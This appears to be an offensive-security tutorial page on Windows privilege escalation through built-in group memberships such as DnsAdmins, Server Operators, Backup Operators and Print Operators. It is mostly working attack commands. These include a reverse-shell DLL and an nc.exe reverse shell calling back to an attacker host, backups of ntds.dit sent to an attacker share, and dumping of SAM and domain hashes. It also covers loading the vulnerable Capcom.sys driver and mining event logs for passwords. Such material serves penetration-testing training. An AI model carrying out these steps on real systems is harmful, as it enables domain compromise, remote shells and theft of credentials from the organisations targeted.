---
title: 'Windows Group Privileges'
description: 'Exploiting Windows built-in group memberships for privilege escalation — DnsAdmins, Server Operators, Backup Operators, Print Operators, Hyper-V Administrators, Event Log Readers, and more.'
---

# Windows Group Privileges

Certain built-in Windows groups grant their members permissions that can be directly abused for privilege escalation. Always check `whoami /groups` and look for these group memberships.

---

## Quick Reference — Dangerous Groups

| Group | Escalation Path | Privilege Gained |
|:------|:---------------|:-----------------|
| **Backup Operators** | Copy SAM/SYSTEM/ntds.dit via `SeBackupPrivilege` | Domain hash extraction |
| **DnsAdmins** | Load malicious DLL via DNS service config | SYSTEM on DC |
| **Server Operators** | Modify service binpath + restart | SYSTEM on DC |
| **Print Operators** | `SeLoadDriverPrivilege` → load vulnerable driver | Kernel code execution |
| **Hyper-V Administrators** | Clone DC virtual disk → offline ntds.dit extraction | Domain compromise |
| **Event Log Readers** | Read security/PowerShell logs for cleartext creds | Credential harvesting |
| **Remote Management Users** | WinRM/PSRemoting access → lateral movement | Remote code execution |
| **Distributed COM Users** | DCOM-based lateral movement | Remote code execution |

---

## DnsAdmins → SYSTEM

### Prerequisites

- Membership in the **DnsAdmins** group
- Target must be a Domain Controller running the DNS Server service
- DNS service runs as **`NT AUTHORITY\SYSTEM`**

### How It Works

Members of `DnsAdmins` can configure the DNS service to load an arbitrary DLL via the `ServerLevelPluginDll` registry key. When the DNS service restarts, it loads and executes the DLL as SYSTEM.

```
┌─────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│  DnsAdmins user  │───▶│ dnscmd /config    │───▶│ DNS Service      │
│  configures DLL  │    │ /serverlevelplug  │    │ loads DLL as     │
│  (UNC path)      │    │ indll \\IP\s\x.dll│    │ NT AUTH\SYSTEM   │
└─────────────────┘    └──────────────────┘    └──────────────────┘
```

### Step-by-Step

**Step 1 — Generate the DLL (on attacker machine)**:

```bash
# Reverse shell DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o dns_plugin.dll

# Host via SMB share (impacket)
impacket-smbserver share $(pwd) -smb2support
```

**Step 2 — Configure DNS to load the DLL (on target)**:

```cmd
:: Set the plugin DLL path (UNC path to attacker's SMB share)
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER_IP\share\dns_plugin.dll
```

!!! warning "You Need to Restart DNS"
    The DLL is loaded on DNS service startup. You need `sc stop dns` / `sc start dns` permissions, or wait for a reboot. **Server Operators** can also restart services, making this a good combo.

**Step 3 — Restart the DNS service**:

```cmd
:: If you have permissions to restart
sc stop dns
sc start dns

:: Or ask a Server Operator to do it, or wait for reboot
```

**Step 4 — Catch the reverse shell on your listener**:

```bash
nc -lvnp 4444
```

**Step 5 — Clean up**:

```cmd
:: Remove the plugin DLL configuration
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v ServerLevelPluginDll /f

:: Restart DNS to unload
sc stop dns
sc start dns
```

!!! tip "Alternative: Use a custom DLL that adds a local admin"
    If reverse shells are unreliable, compile a DLL that runs `net localgroup administrators youruser /add` in `DllMain()`.

---

## Server Operators → SYSTEM

### Prerequisites

- Membership in the **Server Operators** group
- Target must be a Domain Controller
- Group can **start/stop services**, **modify service configurations**, **backup/restore files**, and **shut down the system**

### How It Works

Server Operators can change the binary path (`binpath`) of a service to point to a malicious command. When the service starts, the command runs as the service's configured account (typically SYSTEM).

### Step-by-Step

**Step 1 — Identify a target service**:

```cmd
:: List services and their start accounts
sc query state= all | findstr /i "SERVICE_NAME DISPLAY_NAME STATE"

:: Check a specific service config
sc qc AppReadiness

:: Look for services running as LocalSystem
wmic service where 'StartName like "%%LocalSystem%%"' get Name, StartName, State
```

**Step 2 — Modify the service binary path**:

```cmd
:: Option A: Add yourself as local admin
sc config AppReadiness binPath= "cmd /c net localgroup Administrators YOUR_USER /add"

:: Option B: Reverse shell
sc config AppReadiness binPath= "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

!!! warning "Space After `binPath=`"
    The space after `binPath=` is **required** by `sc config` syntax. `binPath="cmd..."` will fail. Use `binPath= "cmd..."`.

**Step 3 — Restart the service**:

```cmd
sc stop AppReadiness
sc start AppReadiness
```

!!! tip "Service Will 'Fail'"
    The service will report a startup failure because your command isn't a real service binary. This is normal — the command still executes as SYSTEM. Check your listener or verify the user was added.

**Step 4 — Restore the original binpath**:

```cmd
:: Always restore after exploitation
sc config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness"
```

---

## Backup Operators → Domain Hash Extraction

### Prerequisites

- Membership in the **Backup Operators** group
- Group grants `SeBackupPrivilege` and `SeRestorePrivilege`
- Can log on locally to Domain Controllers

### What You Can Do

Bypass all file DACLs to read any file, including:

- `C:\Windows\System32\config\SAM` — local password hashes
- `C:\Windows\System32\config\SYSTEM` — boot key for SAM decryption
- `C:\Windows\NTDS\ntds.dit` — **entire AD database** (on DCs)

### Method 1: Registry Hive Export (Quick Local Hashes)

```cmd
:: Export SAM, SYSTEM, SECURITY
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
```

```bash
# Extract on attacker machine
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Method 2: diskshadow for ntds.dit (Domain Controller)

The `ntds.dit` file is locked by Active Directory. You must use Volume Shadow Copy to access it.

**Create a diskshadow script file** (`C:\temp\shadow.txt`):

```
set context persistent nowriters
add volume c: alias pwned
create
expose %pwned% z:
```

**Execute**:

```cmd
:: Run diskshadow with the script
diskshadow.exe /s C:\temp\shadow.txt

:: Copy ntds.dit from the shadow volume
:: /b flag uses Backup mode (SeBackupPrivilege)
robocopy /b z:\Windows\NTDS C:\temp ntds.dit

:: Get the SYSTEM hive
reg save HKLM\SYSTEM C:\temp\SYSTEM

:: Transfer both files to attacker machine
```

**Extract all domain hashes**:

```bash
# Dumps ALL domain user NTLM hashes
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Output includes: domain\user:RID:LMhash:NThash:::
```

**Clean up**:

```cmd
:: Remove the shadow copy
diskshadow.exe
DISKSHADOW> delete shadows all
DISKSHADOW> exit
```

### Method 3: wbadmin Backup

```cmd
:: Backup ntds.dit via Windows Server Backup
wbadmin start backup -backuptarget:\\ATTACKER\share -include:C:\Windows\NTDS -quiet
```

---

## Print Operators → Kernel Code Execution

### Prerequisites

- Membership in the **Print Operators** group
- Group grants `SeLoadDriverPrivilege` on Domain Controllers
- Can log on locally to DCs

### How It Works

`SeLoadDriverPrivilege` allows loading kernel-mode drivers. By loading a **known-vulnerable signed driver** (such as `Capcom.sys`), you gain the ability to execute arbitrary code in kernel mode.

### Exploitation — Capcom.sys Technique

**Tools**:
- [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) — registers and loads a driver
- [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) — vulnerable signed driver
- [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) — leverages Capcom.sys for code execution

```cmd
:: Step 1: Register and load the vulnerable driver
EoPLoadDriver.exe System\CurrentControlSet\CapcomDrv C:\temp\Capcom.sys

:: Step 2: Exploit the driver to get SYSTEM
ExploitCapcom.exe
```

!!! tip "Alternative: Bring Your Own Vulnerable Driver (BYOVD)"
    If `Capcom.sys` is blocked, there are other signed-but-vulnerable drivers that expose similar functionality. Research the specific target's driver signature enforcement policy.

---

## Hyper-V Administrators → Domain Compromise

### Prerequisites

- Membership in the **Hyper-V Administrators** group
- A Domain Controller running as a Hyper-V virtual machine

### How It Works

Hyper-V Admins have full control over virtual machines, including the ability to clone virtual hard disks. If a DC is virtualized, you can clone its disk and extract the AD database offline.

### Step-by-Step

```powershell
# Step 1: List VMs (find the Domain Controller)
Get-VM

# Step 2: Export the VM (creates a copy of its VHD/VHDX)
Export-VM -Name 'DC01' -Path 'C:\temp\export'

# Step 3: Mount the VHDX offline
Mount-VHD -Path "C:\temp\export\DC01\Virtual Hard Disks\DC01.vhdx" -ReadOnly

# Step 4: The disk is now accessible as a drive letter
# Navigate to \Windows\NTDS\ and copy ntds.dit
copy E:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
reg save HKLM\SYSTEM C:\temp\SYSTEM

# Step 5: Dismount
Dismount-VHD -Path "C:\temp\export\DC01\Virtual Hard Disks\DC01.vhdx"
```

```bash
# Step 6: Extract all hashes on attacker machine
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Event Log Readers → Credential Harvesting

### Prerequisites

- Membership in the **Event Log Readers** group

### What to Look For

Windows Security logs can contain sensitive information when **command-line process auditing** (Event ID 4688) or **PowerShell Script Block Logging** (Event ID 4104) is enabled.

### Searching for Credentials in Security Logs

```cmd
:: Search Security event logs for process creation events with command lines
:: Event ID 4688 = Process Creation
wevtutil qe Security /f:text /q:"*[System[(EventID=4688)]]" | findstr /i "password"
wevtutil qe Security /f:text /q:"*[System[(EventID=4688)]]" | findstr /i "net user"
```

```powershell
# PowerShell — search process creation logs
Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4688]]' -MaxEvents 1000 |
    Where-Object { $_.Message -match 'password|credential|net user' } |
    Format-List TimeCreated, Message
```

### Searching PowerShell Logs

```powershell
# Search PowerShell Script Block logs (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath '*[System[EventID=4104]]' |
    Where-Object { $_.Message -match 'password|credential|ConvertTo-SecureString|PSCredential' } |
    Format-List TimeCreated, Message
```

### Searching PowerShell Transcripts

```cmd
:: Transcripts are typically saved to a configured directory
dir /s /b C:\Transcripts\*.txt 2>nul
dir /s /b C:\PSTranscripts\*.txt 2>nul

:: Or check the Group Policy setting for transcript path
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v OutputDirectory
```

---

## Remote Management Users

### What It Grants

Members can connect via **WinRM** (Windows Remote Management) / **PowerShell Remoting**.

```powershell
# Connect to the target via PSRemoting
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user

# Or run commands remotely
Invoke-Command -ComputerName TARGET -Credential DOMAIN\user -ScriptBlock { whoami; hostname }
```

```bash
# From Linux with evil-winrm
evil-winrm -i TARGET_IP -u user -p 'password'
evil-winrm -i TARGET_IP -u user -H 'NTLM_HASH'
```

---

## Group Enumeration Cheatsheet

```cmd
:: Check your group memberships
whoami /groups

:: List all local groups
net localgroup

:: Check specific group members
net localgroup "Backup Operators"
net localgroup "DnsAdmins"
net localgroup "Server Operators"
net localgroup "Print Operators"
net localgroup "Hyper-V Administrators"
net localgroup "Event Log Readers"
net localgroup "Remote Management Users"
```

```powershell
# Domain group enumeration (AD module)
Get-ADGroupMember -Identity "DnsAdmins"
Get-ADGroupMember -Identity "Server Operators"
Get-ADGroupMember -Identity "Backup Operators"

# PowerView
Get-DomainGroupMember -Identity "DnsAdmins"
Get-DomainGroupMember -Identity "Server Operators"
```
